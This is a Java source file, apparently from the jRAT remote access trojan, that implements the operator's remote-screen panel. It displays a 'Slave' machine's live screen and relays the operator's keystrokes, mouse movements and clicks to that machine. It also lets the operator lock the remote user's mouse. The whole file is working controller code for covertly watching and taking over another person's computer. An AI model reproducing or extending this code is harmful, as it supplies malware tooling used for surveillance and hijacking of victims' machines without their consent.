package jrat.module.screen.ui;

import graphslib.monitors.RemoteMonitor;
import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.common.utils.DataUnits;
import jrat.controller.ErrorDialog;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.*;
import jrat.controller.threads.ThreadFPS;
import jrat.controller.ui.components.JRemoteScreenPane;
import jrat.controller.ui.renderers.JComboBoxIconRenderer;
import jrat.module.screen.packets.PacketRemoteScreenStop;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.File;


@SuppressWarnings("serial")
public class PanelScreenController extends ClientPanel {

	private BufferedImage buffer;
	
	private int transmitted;
	private int chunks;
	
	private int monitor;
	private int quality;
	private int interval;
	private int size;
	private ThreadFPS threadFps = new ThreadFPS() {
		public void onUpdate(int fps) {
			lblFps.setText("    FPS: " + fps + "    ");
		}
	};

    private JRemoteScreenPane screenPane;
	private JProgressBar progressBar;
	private JButton btnStart;
	private JButton btnStop;
	private JLabel lblFps;
	private JSlider sliderSize;
	private JLabel lblSize;
	private JToggleButton tglbtnToggleMouse;
	private JToggleButton tglbtnToggleMouseLock;
    private JToggleButton tglbtnToggleMovement;
	private JComboBox cbMonitors;
    private JLabel lblQuality;
	private JSlider sliderQuality;
	private JLabel lblBlockSize;
	private JLabel lblChunks;

	public PanelScreenController(Slave sl) {
		super(sl, "Screen", Resources.getIcon("screen"));

		slave = sl;
		threadFps.start();

        JToolBar toolBarTop = new JToolBar();
		toolBarTop.setFloatable(false);

        JToolBar toolBarBottom = new JToolBar();
		toolBarBottom.setFloatable(false);
		
		screenPane = new JRemoteScreenPane();
		screenPane.getPanel().addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent e) {
				slave.addToSendQueue(new Packet94KeyPress(e.getKeyCode()));
			}
			
			@Override
			public void keyReleased(KeyEvent e) {
				slave.addToSendQueue(new Packet95KeyRelease(e.getKeyCode()));
			}
			
			@Override
			public void keyTyped(KeyEvent e) {
				
			}
		});
		screenPane.getPanel().addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (tglbtnToggleMouse.isSelected()) {
					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));

					int button = e.getButton();
					int button2 = 16;
					if (button == 3) {
						button2 = 4;
					}

					slave.addToSendQueue(new Packet92MousePress((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
				}
			}

			@Override
			public void mouseReleased(MouseEvent e) {
				if (tglbtnToggleMouse.isSelected()) {
					int button = e.getButton();
					int button2 = 16;
					if (button == 3) {
						button2 = 4;
					}

					slave.addToSendQueue(new Packet93MouseRelease((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
				}
			}
		});
		
		screenPane.getPanel().addMouseMotionListener(new MouseMotionAdapter() {
			@Override
			public void mouseMoved(MouseEvent e) {
				if (tglbtnToggleMovement.isSelected()) {
					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));
				}
			}
		});
		
		progressBar = new JProgressBar();
		toolBarBottom.add(progressBar);
		toolBarBottom.addSeparator();

        JLabel lblMonitor = new JLabel("Monitor:  ");
		lblMonitor.setIcon(Resources.getIcon("monitor"));
		toolBarBottom.add(lblMonitor);
		
		cbMonitors = new JComboBox();
		cbMonitors.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				monitor = cbMonitors.getSelectedIndex() - 1;
				sendUpdate();
			}
		});
		DefaultComboBoxModel model = new DefaultComboBoxModel();
		cbMonitors.setModel(model);
		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
		cbMonitors.setRenderer(renderer);
		model.removeAllElements();
		model.addElement("Default");
		renderer.addIcon("default", Resources.getIcon("monitor-arrow"));

		ImageIcon icon = Resources.getIcon("monitor");

		for (RemoteMonitor monitor : slave.getMonitors()) {
			renderer.addIcon(monitor.getLabel(), icon);
			model.addElement(monitor.getLabel());
		}
		
		toolBarBottom.add(cbMonitors);
		toolBarBottom.addSeparator();
		
		lblFps = new JLabel("    FPS: 0    ");
		toolBarBottom.add(lblFps);
		
		lblBlockSize = new JLabel("Block Size: 0 B");
		toolBarBottom.add(lblBlockSize);
		
		lblChunks = new JLabel("   Chunks: ");
		toolBarBottom.add(lblChunks);
		
		btnStart = new JButton("");
		btnStart.setToolTipText("Start");
		btnStart.setIcon(Resources.getIcon("start"));
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				start();
			}
		});
		toolBarTop.add(btnStart);
		
		btnStop = new JButton("");
		btnStop.setToolTipText("Stop");
		btnStop.setIcon(Resources.getIcon("stop"));
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				stop();
			}
		});
		btnStop.setEnabled(false);
		toolBarTop.add(btnStop);
		
		toolBarTop.addSeparator();
		
		lblSize = new JLabel("Size: " + size + "%");
		lblSize.setIcon(Resources.getIcon("application-resize"));
		toolBarTop.add(lblSize);
		
		sliderSize = new JSlider();
		sliderSize.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				setImageSize(sliderSize.getValue());
				sendUpdate();
			}
		});
		sliderSize.setToolTipText("Size");
		sliderSize.setSnapToTicks(true);
		toolBarTop.add(sliderSize);
		toolBarTop.addSeparator();
		
		lblQuality = new JLabel("Quality: " + quality);
		toolBarTop.add(lblQuality);
		lblQuality.setIcon(Resources.getIcon("monitor-plus"));
		
		sliderQuality = new JSlider();
		sliderQuality.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				setQuality(sliderQuality.getValue());
				sendUpdate();
			}
		});
		toolBarTop.add(sliderQuality);
		sliderQuality.setValue(5);
		sliderQuality.setSnapToTicks(true);
		sliderQuality.setMinorTickSpacing(1);
		sliderQuality.setMaximum(10);
		
		tglbtnToggleMouse = new JToggleButton("");
		tglbtnToggleMouse.setSelected(true);
		tglbtnToggleMouse.setIcon(Resources.getIcon("mouse"));
		toolBarTop.add(tglbtnToggleMouse);

		tglbtnToggleMouseLock = new JToggleButton("");
		tglbtnToggleMouseLock.setIcon(Resources.getIcon("mouse_disabled"));
		tglbtnToggleMouseLock.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				slave.addToSendQueue(new Packet27ToggleMouseLock(tglbtnToggleMouseLock.isSelected()));
			}
		});
		toolBarTop.add(tglbtnToggleMouseLock);

		toolBarTop.addSeparator();

        JToggleButton tglbtnToggleKeyboard = new JToggleButton("");
		tglbtnToggleKeyboard.setSelected(true);
		tglbtnToggleKeyboard.setIcon(Resources.getIcon("keyboard"));
		toolBarTop.add(tglbtnToggleKeyboard);
		
		tglbtnToggleMovement = new JToggleButton("");
		tglbtnToggleMovement.setIcon(Resources.getIcon("arrow-move"));
		toolBarTop.add(tglbtnToggleMovement);
		
		toolBarTop.addSeparator();
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(toolBarTop, GroupLayout.PREFERRED_SIZE, 657, GroupLayout.PREFERRED_SIZE)
				.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 657, Short.MAX_VALUE)
				.addComponent(toolBarBottom, GroupLayout.PREFERRED_SIZE, 657, GroupLayout.PREFERRED_SIZE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(toolBarTop, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 357, Short.MAX_VALUE)
					.addComponent(toolBarBottom, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
		);
		setLayout(groupLayout);
	}
	
	public void sendUpdate() {
		buffer = null;
	}

	public void start() {
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);
			
		slave.addToSendQueue(new Packet12RemoteScreen(size, quality, monitor, getColumns(), getRows()));
	}
	
	public void stop() {
		btnStart.setEnabled(true);
		btnStop.setEnabled(false);
		
		transmitted = 0;
		slave.addToSendQueue(new PacketRemoteScreenStop());
	}

	@Override
	public void dispose() {
	    super.dispose();

		threadFps.stopRunning();

		slave.addToSendQueue(new Packet27ToggleMouseLock(false));
		slave.addToSendQueue(new PacketRemoteScreenStop());
	}

	public Frame displayFrame() {
        Frame frame = super.displayFrame();

        if (slave.getMonitors().length > 1) {
            DialogMonitors dialog = new DialogMonitors(this, slave);
            dialog.setVisible(true);
        }

        return frame;
    }
	
	public void capture() {
		BufferedImage image = screenPane.getPanel().getImage();
		
		JFileChooser c = new JFileChooser();
		c.showOpenDialog(null);
		File f = c.getSelectedFile();
		
		if (f != null) {
			try {
				ImageIO.write(image, "png", f);
			} catch (Exception e) {
				ErrorDialog.create(e);
				e.printStackTrace();
			}
		}
	}
	
	public void drawOverlay(BufferedImage image) {
		screenPane.update(image);
		threadFps.increase();
	}
	
	public void update(BufferedImage image) {
		screenPane.update(image);
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
		lblQuality.setText("Quality: " + quality);
	}

	public int getInterval() {
		return interval;
	}

	public void setInterval(int interval) {
		this.interval = interval;
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
		buffer = null;
		lblSize.setText("Size: " + size + "%");
	}
	
	public ThreadFPS getFPSThread() {
		return threadFps;
	}

	public JProgressBar getProgressBar() {
		return progressBar;
	}

	public Slave getSlave() {
		return slave;
	}

	public JSlider getSliderSize() {
		return sliderSize;
	}

	public JComboBox getCbMonitors() {
		return cbMonitors;
	}

	public JSlider getSliderQuality() {
		return sliderQuality;
	}
	
	public boolean isRunning() {
		return btnStop.isEnabled();
	}

	public BufferedImage getBuffer() {
		return buffer;
	}

	public void setBuffer(BufferedImage buffer) {
		this.buffer = buffer;
	}
	
	public int getColumns() {
		return 4;
	}
	
	public int getRows() {
		return 4;
	}

	public int getTransmitted() {
		return transmitted;
	}

	public void setTransmitted(int transmitted) {
		this.transmitted = transmitted;
	}
	
	public void setBlockSizeLabel(int b) {
		lblBlockSize.setText("Block Size: " + DataUnits.getAsString((long) b));
	}

	public int getChunks() {
		return chunks;
	}

	public void setChunks(int chunks) {
		this.chunks = chunks;
	}
	
	public void setChunksLabel(int chunks) {
		lblChunks.setText("   Chunks: " + chunks);
	}

}
